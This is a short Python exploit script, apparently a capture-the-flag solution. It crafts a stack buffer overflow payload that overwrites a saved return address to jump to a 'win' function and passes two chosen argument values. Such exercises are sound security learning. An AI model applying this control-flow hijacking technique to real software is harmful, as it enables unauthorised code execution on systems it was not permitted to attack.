import struct

ebp = 0xffffd438
input_addr = ebp - 0x6c
return_addr_addr = 0xffffd43c
win_addr = 0x0804929a
arg1_addr = ebp + 0x8
arg2_addr = ebp + 0xc

offset0 = (return_addr_addr - input_addr)
payload = b"A" * offset0 
payload += struct.pack("I", win_addr)
payload += b"A" * 4
payload += struct.pack("I", 0xcafef00d)
payload += struct.pack("I", 0xf00df00d)

print(payload)